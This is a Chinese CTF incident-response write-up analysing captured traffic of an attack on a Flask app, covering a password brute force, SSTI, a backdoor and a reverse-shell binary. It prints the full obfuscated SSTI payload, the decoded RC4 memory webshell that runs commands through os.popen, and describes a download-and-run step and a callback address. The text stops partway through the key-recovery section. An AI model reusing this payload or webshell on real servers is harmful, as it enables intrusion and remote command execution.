---
created: 2026-01-12
modified: 2026-01-14
tags:
  - CTF/应急响应
---

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

# 概述

> [!info]
> 近期发现公司网络出口出现了异常的通信，现需要通过分析出口流量包，对失陷服务器进行定位。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写 exp 或数据包重放，查找服务器上安装的后门木马，然后分析木马外联地址和通信密钥以及木马启动项位置。 

# 步骤

## 1 步骤一

> [!info]
> 攻击者爆破成功的后台密码是什么？，结果提交形式：flag{xxxxxxxxx}

搜索 `POST` 请求，在一堆 `/admin/login` 路由中找到最后一个请求。

![[第三届长城杯初赛SnakeBackdoor-260112-183404.png]]

追踪这个请求的 `http` 流，会发现这个请求的响应是一个重定向，重定向到了 `/admin/panel` 路由，明显就是登录成功的意思，所以爆破成功的密码就是 `zxcvbnm123`

![[第三届长城杯初赛SnakeBackdoor-260112-183613.png]]

```flag1
flag{zxcvbnm123}
```

## 2 步骤二

> [!info]
> 攻击者通过漏洞利用获取 Flask 应用的 SECRET_KEY 是什么，结果提交形式：flag{xxxxxxxxxx}

在 `http` 追踪流界面稍微往后翻几个流，就会看见一个明显的 `SSTI` 测试请求，并且它的响应表明确实有 `SSTI` 漏洞，如下图：

![[第三届长城杯初赛SnakeBackdoor-260112-191216.png]]

再往后翻几个流，会看到 `{{config}}` 的 `SSTI`，我们查看一下他的响应

![[第三届长城杯初赛SnakeBackdoor-260112-191455.png]]

可以看到他的响应里回显的 `{{config}}` 的结果中就有 `SECRET_KEY`

![[第三届长城杯初赛SnakeBackdoor-260112-191510.png]]

```flag2
flag{c6242af0-6891-4510-8432-e1cdf051f160}
```

## 3 步骤三

> [!info]
> 攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入 Payload，给出该加密算法使用的密钥字符串 (Key) ，结果提交形式：flag{xxxxxxxx}

往后追踪到下面这个流有一大段 `SSTI` 逻辑，我们复制出来解析一下

![[第三届长城杯初赛SnakeBackdoor-260112-202727.png]]

如下面的代码所示，其实就是用 `exec` 执行一串 `base64` 编码过的逻辑，然后注入了 `'request':url_for.__globals__['request']` 和 `'app':get_flashed_messages.__globals__['current_app']` 两个变量到 `exec` 中的作用域中。

```python
url_for.__globals__['__builtins__']['exec'](
    "import base64; exec(base64.b64decode('XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpOwpleGVjKChfKShiJz1jNENVM3hQKy8vdlB6ZnR2OGdyaTYzNWEwVDFyUXZNbEtHaTNpaUJ3dm02VEZFdmFoZlFFMlBFajdGT2NjVElQSThUR3FaTUMrbDlBb1lZR2VHVUFNY2Fyd1NpVHZCQ3YzN3lzK04xODVOb2NmbWpFL2ZPSGVpNE9uZTBDTDVUWndKb3BFbEp4THI5VkZYdlJsb2E1UXZyamlUUUtlRytTR2J5Wm0rNXpUay9WM25aMEc2TmVhcDdIdDZudSthY3hxc3Ivc2djNlJlRUZ4ZkVlMnAzMFlibXl5aXMzdWFWMXArQWowaUZ2cnRTc01Va2hKVzlWOVMvdE8rMC82OGdmeUtNL3lFOWhmNlM5ZUNEZFFwU3lMbktrRGlRazk3VFV1S0RQc09SM3BRbGRCL1VydmJ0YzRXQTFELzljdFpBV2NKK2pISkwxaytOcEN5dktHVmh4SDhETEw3bHZ1K3c5SW5VLzl6dDFzWC9Uc1VSVjdWMHhFWFpOU2xsWk1acjFrY0xKaFplQjhXNTl5bXhxZ3FYSkpZV0ppMm45NmhLdFNhMmRhYi9GMHhCdVJpWmJUWEZJRm1ENmtuR3ovb1B4ZVBUenVqUHE1SVd0OE5abXZ5TTVYRGcvTDhKVS9tQzRQU3ZYQStncWV1RHhMQ2x6Uk5ESEpVbXZ0a2FMYkp2YlpjU2c3VGdtN1VTZUpXa0NRb2pTaStJTklFajVjTjErRkZncEtSWG40Z1I5eXAzL1Y3OVduU2VFRklPNkM0aGNKYzRtd3BrKzA5dDF5dWU0K21BbGJobHhuWE0xUGZrK3NHQm1hVUZFMWtFak9wbmZHbnFzVithdU9xakpnY0RzaXZJZCt3SFBIYXp0NU1WczRySFJoWUJPQjZ5WGp1R1liRkhpM1hLV2hiN0FmTVZ2aHg3RjlhUGpObUlpR3FCVS9oUkZVdU1xQkNHK1ZWVVZBYmQ1cEZEVFpKM1A4d1V5bTZRQUFZUXZ4RytaSkRSU1F5cE9oWEsvTDRlRkZ0RXppdWZaUFN5cllQSldKbEFRc0RPK2RsaTQ2Y24xdTVBNUh5cWZuNHZ3N3pTcWUrVlVRL1JpL0tudjBwUW9XSDFkOWRHSndEZnFtZ3ZuS2krZ05SdWdjZlVqRzczVjZzL3RpaGx0OEIyM0t2bUp6cWlMUHptdWhyMFJGVUpLWmpHYTczaUxYVDRPdmxoTFJhU2JUVDR0cS9TQ2t0R1J5akxWbVNqMmtyMEdTc3FUamxMMmw2Yy9jWEtXalJNdDFrTUNtQ0NUVithSmU0bnB2b0I5OU9NbktuWlI0WXM1MjZtVEZUb1N3YTVqbXhCbWtSWUNtQTgyR0ZLN2FrNmJJUlRmRE1zV0dzWnZBRVh2M1BmdjVOUnpjSUZOTzN0YlFrZUIvTElWT1c1TGZBa21SNjgvNnpyTDBEWm9QanpGWkk1VkxmcTBydjlDd1VlSmtSM1BIY3VqKytkL2xPdms4L2gzSHpTZ1lUR0N3bDF1ano4aDRvVWlQeUdUNzROamJZN2ZKOHZVSHFOeitaVmZPdFZ3L3ozUk11cVNVekVBS3JqY1UyRE5RZWhCMG9ZN3hJbE9UOXU5QlQ0Uk9vREZvKzVaRjZ6Vm9IQTRlSWNrWFVPUDN5cFF2NXBFWUcrMHBXNE15SG1BUWZzT2FXeU1kZk1vcWJ3L005b0ltZEdLZEt5MVdxM2FxK3QreHV5VmROQVFNaG9XMkE3elF6b2I4WEdBM0c4VnVvS0hHT2NjMjVIQ2IvRlllU3hkd3lJZWRBeGtsTExZTUJIb2pUU3BEMWRFeG96ZGk4OUdpa2h6MzMwNW5kVG1FQ3YwWm9VT0hhY25xdFVVaEpseTdWZ3ZYK0psYXdBWTlvck5QVW1aTTdRS2JkT2tUZi9vOGFRbFM1RmUveFFrT01KR200TlhxTGVoaVJJYjkyNXNUZlZ4d29OZlA1djFNR2xhcllNaWZIbDJyRXA1QzcxaXBGanBBR2FFcDluUmowSmdFYTRsU1R1WWVWWHdxYlpRVDNPZlF2Z3QvYkhKbEFndXFTV3lzR2hxaElUSllNNlQxMG03MUppd2ZRSDVpTFhINVhiRms1M1FHY0cyY0FuRnJXeTcweEV2YWJtZjB1MGlrUXdwVTJzY1A4TG9FYS9DbEpuUFN1V3dpY01rVkxya1pHcW5CdmJrNkpUZzdIblQwdkdVY1Y2a2ZmSUw2Q0szYkUxRnkwUjZzbCtVUG9ZdmprZ1NJM1ViZkQ2N2JSeEl4ZWdCcFlUenlDRHpQeXRTRSthNzdzZHhzZ2hMcFVDNWh4ejRaZVhkeUlyYm1oQXFRdzVlRW5CdUFTRTVxVE1Ka1RwLy9oa3krZFQycGNpT0JZbi9BQ1NMeHByTFowQXkxK3pobCtYeVY5V0ZMNE5nQm9IMzRidmt4SDM2bmN0c3pvcFdHUHlkMTRSaVM0ZDBFcU5vY3F2dFd1M1l4a05nUCs4Zk0vZC9CMGlreEt4aC9HamttUVhhU1gvQis0MFU0YmZTYnNFSnBWT3NUSFR5NnUwTnI2N1N3N0J2Und1VnZmVDAvOGo3M2dZSEJPMmZHU0lKNDdBcllWbTIrTHpSVDBpSDVqN3lWUm1wdGNuQW44S2t4SjYzV0JHYjd1M2JkK0QrM3lsbm0xaDRBUjdNR042cjZMeHBqTmxBWDExd2EvWEIxek44Y1dVTm5DM1ZjemZ3VUV3UGZpNWR5bzluRUM1V085VW03OFdLUnJtM2M0OEl2VFVoZ2ROZVFFRG9zSWZoTVNtaWtFbHVRWDhMY0NSY0s5ZVVUODVidnI1SjVyekViK0R1aUdZeURGRzdQWmVmdkliM3czM3UycTh6bHhsdFdDU3RjNU80cThpV3JWSTd0YVpIeG93VHc1ekpnOVRkaEJaK2ZRclF0YzB5ZHJCbHZBbG5ZMTB2RUNuRlVCQSt5MWxXc1ZuOGNLeFVqVGRhdGk0QUYzaU0vS3VFdFE2Wm44Ykk0TFl3TWxHbkNBMVJHODhKOWw3RzRkSnpzV3I5eE9pRDhpTUkyTjFlWmQvUVV5NDNZc0lMV3g4MHlpQ3h6K0c0YlhmMnFOUkZ2Tk9hd1BTbnJwdjZRMG9GRVpvamx1UHg3Y09VMjdiQWJncHdUS28wVlV5SDZHNCt5c3ZpUXpVN1NSZDUxTEdHM1U2Y1QwWURpZFFtejJld3Ria2tLY0dWY1N5WU9lQ2xWNkNSejZiZEYvR20zVDIrUTkxNC9sa1piS3gxOVduWDc4cit4dzZicGp6V0xyMEUxZ2puS0NWeFcwWFNud2UraUc5ZGtHOG5DRmZqVWxoZFRhUzFnSjdMRnNtVWpuOHUvdlJRYlJMdy95NjZJcnIveW5LT0N6Uk9jZ3JuREZ4SDN6M0pUUVFwVGlEcGV5elJzRjRTbkdCTXY1SGJyK2NLNllUYTRNSWJmemo1VGkzRk1nSk5xZ0s1WGs5aHNpbEdzVTZ0VWJucDZTS2lKaFV2SjhicXluVU1Fem5kbCtTK09WUkNhSDJpSmw4VTNXanlCNjhScTRIQVRrL2NLN0xrSkhITWpDM1c3ZFRtT0JwZm9XTVZFTGFMK1JrcVdZdjBDcFc1cUVOTGxuT1BCckdhR05lSVphaHpibnJ1RVBJSVhHa0d6MWZFNWQ0Mk1hS1pzQ1VZdDF4WGlhaTkrY2JLR2ovZDBsSUNxN3VjN2JSaEVCeDQ2RHlCWFR6MWdmSm5UMnVyNng0QXZiNXdZMnBjWXJjRDJPUjZBaWtNdm0yYzBiaGFiSkI2bzBEaE9OSjRsQ3htS2RHQnp1d3J0czF1MEQyeXVvMzd5TExmc0dEdXllcE53OGx5VE5jMm55aENWQmZXMjNEbkJRbVdjMVFMQ29ScHBWaGpLWHdPcE9ES084UjhZSG5RTStyTGs2RU9hYkNkR0s1N2lSek1jVDN3YzQzNmtWbUhYRGNJMFpzWUdZNWFJQzVEYmRXalV0Mlp1VTBMbXVMd3pDVFM5OXpoT29POERLTnFiSzRiSU5MeUFJMlg5Mjh4aWIraG1JT3FwM29TZ0MyUGRGYzh5cXRoTjlTNTVvbXRleDJ4a0VlOENZNDhDNno0SnRxVnRxaFBRV1E4a3RlNnhsZXBpVllDcUliRTJWZzRmTi8vTC9mZi91Ly85cDRMejd1cTQ2eVdlbmtKL3g5MGovNW1FSW9yczVNY1N1Rmk5ZHlneXlSNXdKZnVxR2hPZnNWVndKZScpKQ=='))",
    {
        'request':url_for.__globals__['request'],
        'app':get_flashed_messages.__globals__['current_app']
    }
)
```

我们解码一下这串 `base64`，结果如下：

```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))
```

我们来分析一下上面这串解码 `base64` 后的 `python` 代码：
1. 第一行有一个名为 `_` 的 `lambda` 函数，它接收一个参数 `__`，对这个字符串类型的参数取倒序，然后 `base64` 解码，再然后 `zlib` 解码；
2. 第二行 `exec((_)(b'......'))` 调用上面说的 `lambda` 函数去解码一串倒序 `base64` 字符串，把解码的结果放到 `exec()` 中去执行。

我们把代码中的 `exec` 改为 `print`，会发现输出的依然是 `exec((_)(...))` 的结构，只不过待解码的数据不同了；如果把这个输出结果再放到单独的文件中，再把 `exec` 改为 `print` 后运行，会发现输出的依然是上述结构，只不过待解码的数据又有不同了。

如法炮制好几次都是这样，就会发现上面的解码逻辑嵌套了好几层，我们肯定不方便一层一层手动脱。

于是我们把上面的匿名函数改为一个正常的函数，然后增加一条打印语句去打印每次解码的结果，于是就有下面的代码：

```python
# _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
def _(__):
    res = __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
    print(res.decode())
    return res
exec((_)(b'=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'))
```

接着在 `print` 处下一个断点，然后一次一次地打印，直到看到可以执行的代码为止；调试界面提示发生异常时，我们可以看到打印了可读的代码 (异常的原因是我们这个代码没有注入变量 `app`，找不到这个变量所以报错了)

![[第三届长城杯初赛SnakeBackdoor-260112-205155.png]]

把输出的可读代码保存到一个单独的文件中：

```python
global exc_class
global code
import os,binascii
exc_class, code = app._get_exc_class_and_code(404)
RC4_SECRET = b'v1p3r_5tr1k3_k3y'
def rc4_crypt(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
                j = (j + S[i] + key[i % len(key)]) % 256
                S[i], S[j] = S[j], S[i]
        i = j = 0
        res = bytearray()
        for char in data:
                i = (i + 1) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                res.append(char ^ S[(S[i] + S[j]) % 256])
        return bytes(res)
def backdoor_handler():
        if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
                return "Error"
        enc_hex_cmd = request.form.get('data')
        if not enc_hex_cmd:
                return ""
        try:
                enc_cmd = binascii.unhexlify(enc_hex_cmd)
                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')
                output_bytes = getattr(os, 'popen')(cmd).read().encode('utf-8', errors='ignore')
                enc_output = rc4_crypt(output_bytes, RC4_SECRET)
                return binascii.hexlify(enc_output).decode()
        except:
                return "Error"
app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()
```

然后我们就能很容易看到加密算法的密钥字符串 `RC4_SECRET = b'v1p3r_5tr1k3_k3y'`

```flag3
flag{v1p3r_5tr1k3_k3y}
```

## 4 步骤四

> [!info]
> 攻击者上传了一个二进制后门，请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径

根据上面得到的 `backdoor` 源码，写出加密命令的解密脚本如下：

```python
import binascii

RC4_SECRET = b'v1p3r_5tr1k3_k3y'

def rc4_crypt(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
                j = (j + S[i] + key[i % len(key)]) % 256
                S[i], S[j] = S[j], S[i]
        i = j = 0
        res = bytearray()
        for char in data:
                i = (i + 1) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                res.append(char ^ S[(S[i] + S[j]) % 256])
        return bytes(res)
        
def decode(data):
        enc_cmd = binascii.unhexlify(data)
        return rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')

print(decode(b''))
```

之前得到的 `backdoor` 是注册为 `error_handler` 的，当一个请求触发报错时会执行后门；后门是读取的表单中的 `data` 字段，然后解密后当作系统命令执行的，所以我们只需找到含有 `data` 字段的请求，解密一下 `data` 的内容就能知道攻击者做了什么了。

往后翻 `http` 流，对于每个有 `data` 字段的请求依次解密，得到攻击者执行的操作如下：

![[第三届长城杯初赛SnakeBackdoor-260113-120539.png]]

可以看到是从攻击机上下载了一个 `shell.zip` 到 `/tmp/123.zip`，然后解压出 `/tmp/shell`，再重命名为 `/tmp/python3.13`, 最后执行它。

所以执行的本体文件的名称为 `python3.13`

```flag4
flag{python3.13}
```

## 5 步骤五

> [!info]
> 请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥（hex，小写字母），结果提交形式：`flag{[0-9a-f]+}`

### 5.1 `dump` 木马文件

我们找到传输 `shell.zip` 的流量包，`dump` 下来，用上面 `unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip` 命令中显示的密码 `nf2jd092jd01` 解压，得到 `shell` elf 文件。

![[第三届长城杯初赛SnakeBackdoor-260112-213215.png]]

### 5.2 整体概述

用 `ida` 打开，反编译后，经过分析，改了几个变量名后的代码如下面几张图所示，下面开始具体分析。

(每张图的分析在图的正下方)

![[第三届长城杯初赛SnakeBackdoor-260114-211328.png]]

上面这张图是 `main` 函数的开始部分，主要是：
+ 网络编程部分
    + 调用 `socket` 获得一个 `tcp` 连接的文件描述符 (可能描述地不准确)
    + 初始化目标地址 `192.168.1.201:58782`，这个就是攻击机监听的服务地址
    + 调用 `connect` 连接攻击机服务，接下来的操作就是利用 `fd` 文件描述符像文件读写一样跟攻击机收发数据了
+ SM4 加密部分 (后面会提到为什么是 `SM4` 的)
    + 用 `read` 读的第一个数据 `seed_`，转换大小端后作为随机数种子生成四个字 (`32bit`) 作为种子密钥 (`MK__`)
    + 调用 `init_rk`，用种子密钥生成轮密钥 `rk`；由于 `SM4` 算法加解密算法完全一致，仅轮密钥分正序和倒序，调用了两次 `init_rk` 分别生成解密轮密钥 (`de_rk`) 和加密轮密钥 (`en_rk`)

![[第三届长城杯初赛SnakeBackdoor-260114-205840.png]]

上面这张图就是接收加密的数据，解密后作为系统命令执行；执行的结果再加密后发回去的逻辑；其中需要注意的一点就是两个地方的 `pkcs#7` 填充与解填充，用于将实际数据与分组密码对齐；

具体的流程是：
1. 接收加密数据的长度
2. 接收解密数据本身
3. 解密数据，去掉 `pkcs#7` 填充，作为命令执行
4. 执行的结果填充 `pkcs#7`，加密
5. 发送加密结果的长度
6. 发送加密结果本身

### 5.3 从流量包中找到随机数种子

上面整体概述中已经说了密钥的生成方法，就是把木马连接到攻击机后收到的第一个数据作为随机数种子给 `srand`，然后调用随机数生成函数 `rand` 生成四个 `uint32` 的数据作为密钥；

